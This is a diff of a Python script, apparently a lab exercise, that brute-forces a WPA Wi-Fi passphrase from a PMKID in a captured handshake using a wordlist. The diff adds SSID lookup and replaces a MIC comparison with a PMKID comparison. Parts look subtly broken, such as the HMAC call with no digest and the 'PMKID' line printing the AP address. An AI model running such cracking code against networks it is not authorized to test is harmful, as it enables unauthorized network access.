@@ -57,13 +57,13 @@ def get_pmkid_packet(packets):
     """
     for p in packets:
         # Find the first message of a handshake. It is caracterized by having wpa_key_mic at 0
-        if p.haslayer(WPA_key) and not int.from_bytes(p.wpa_key_mic, "big"): # big or little endian is not important
+        if p.haslayer(WPA_key) and not int.from_bytes(p.wpa_key_mic, "big"):  # big or little endian is not important
             return p
 
     raise Exception("Couldn't find PMKID")
 
-def pmkid_brutefore(pmkid, mac_ap, mac_sta, const, wordlist):
 
+def pmkid_bruteforce(pmkid, ssid, mac_ap, mac_sta, const, wordlist):
     with open(wordlist) as file1:
         pmkid_expected = b2a_hex(pmkid)
 
@@ -74,20 +74,26 @@ def pmkid_brutefore(pmkid, mac_ap, mac_sta, const, wordlist):
 
             # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
             pmk = pbkdf2(hashlib.sha1, passphrase, ssid, 4096, 32)
+            # calculate pmkid
+            pmkid_guess = hmac.new(pmk, f"{const}{mac_ap}{mac_sta}")
 
+            print(f"\r{passphrase.decode():20} = {pmkid_guess}          ", end="", flush=True)
 
-            # calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
-            mic = hmac.new(ptk[0:16], data, hashlib.sha1)
-            mic_guess = bytes(mic.hexdigest(), "utf-8")[:-8]
-
-            print(f"\r{passphrase.decode():20} = {mic_guess}          ", end="", flush=True)
-
-            if mic_guess == mic_expected:
+            if pmkid_guess == pmkid_expected:
                 print("")
                 return passphrase.decode()
 
     print("")
     return None
+
+
+def find_ssid(ap_mac, packets):
+    for p in packets:
+        if p.haslayer("Dot11AssoReq") and p.addr1 == ap_mac:
+            ssid = p.info
+            return ssid
+
+    raise Exception("Couldn't find the SSID of this MAC address")
 
 
 def main(pcap_file, dictionary):
@@ -97,18 +103,23 @@ def main(pcap_file, dictionary):
     p = get_pmkid_packet(wpa)
 
     pmkid = p.wpa_key[-16:]
-    
+
     ap_mac = p.addr1
     sta_mac = p.addr2
     const = "PMK Name"
+    ssid = find_ssid(ap_mac, wpa)
 
     print("Values used to calculate PMKID:")
     print("PMKID:       ", b2a_hex(ap_mac))
     print("AP Mac:      ", b2a_hex(ap_mac))
     print("CLient Mac:  ", b2a_hex(sta_mac))
+    print("SSID:        ", ssid)
     print("Constant:    ", const)
 
-    passphrase = pmkid_bruteforce(pmkid, ap_mac, sta_mac, const, dictionary)
+    print("\nBruteforcing PMKID")
+    print("============================")
+    print("Expected PMKID:         ", b2a_hex(pmkid))
+    passphrase = pmkid_bruteforce(pmkid, ssid, ap_mac, sta_mac, const, dictionary)
 
     if passphrase:
         print("Found passphrase:", passphrase)
@@ -116,9 +127,7 @@ def main(pcap_file, dictionary):
         print("Couldn't find the passphrase with this word list.")
 
 
-
 if __name__ == "__main__":
-
     default_wordlist = "wordlists/WiFi-WPA/probable-v2-wpa-top62.txt"  # https://github.com/Taknok/French-Wordlist
     pcap = "PMKID_handshake.pcap"
     main(pcap, default_wordlist)
